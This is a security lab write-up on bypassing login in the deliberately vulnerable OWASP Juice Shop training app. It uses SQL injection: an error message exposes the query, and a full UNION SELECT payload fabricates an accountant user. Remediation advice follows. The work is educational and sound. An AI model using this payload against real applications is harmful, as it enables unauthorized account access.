Web Security Lab: Authentication Bypass & User Synthesis via SQL Injection

1. Overview

Objective: Log in as a non-existing accountant user without performing a standard registration.

Vulnerability: SQL Injection (Error-Based Information Disclosure & UNION-Based Payload Execution).

Target Application: OWASP Juice Shop (http://localhost:3000/#/login)

2. Reconnaissance & Error Disclosure

Step 1: Triggering SQL Injection

Navigate to the login endpoint (http://localhost:3000/#/login) and enter a single quote (') into the Email field while entering an arbitrary string in the Password field. Open Browser Developer Tools (F12) and observe the network response tab under the /rest/user/login request.

Step 2: Analyzing the Backend Query

The database error exposes the raw SQL query structure executed by the backend application:

SELECT * FROM Users WHERE email = ''' AND password = '339df5aeae5bc6ae557491e02619c5dd' AND deletedAt IS NULL


Key Findings from Error Message:

Unsanitized Input: The single quote (') broke out of the SQL string literal, proving lack of parameterization.

Password Hashing: The application hashes the input password (MD5) before constructing the SQL query string.

Target Table: The table name is Users.

3. Schema Discovery & Exfiltration

Before constructing a custom UNION SELECT payload, the exact column structure of the Users table must be determined.

Exfiltrate Database Schema: Inject UNION SELECT statements querying sqlite_master or information_schema.columns to map out column names and expected data types.

Identified Schema Structure:

id, username, email, password, role, deluxeToken, lastLoginIp, profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt

4. Exploitation: User Synthesis via UNION SELECT

Strategy

To synthesize a valid user on-the-fly without database modification:

Invalidate Original Query: Use a initial quote ' with non-existent input so the primary query returns zero rows.

Inject Synthetic Row: Use UNION SELECT with static values matching the exact column count and expected data types of the Users table.

Comment Out Trailing Query: Append -- to comment out the rest of the original query (including password check and deletedAt IS NULL).

Constructed Payload

' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--


5. Result & Verification

Submit the payload in the Email field.

The backend database returns the injected row to the application logic.

The application treats the returned dataset as a valid authentication result, issuing a signed JSON Web Token (JWT) for acc0unt4nt@juice-sh.op.

User session is established under the synthesized accounting identity with full privileges assigned to the accounting role.

6. Remediation Guidance

Parameterized Queries: Use prepared statements with parameterized inputs to separate code from data.

Disable Verbose Errors: Ensure database errors and raw query disclosures are suppressed in production environments.
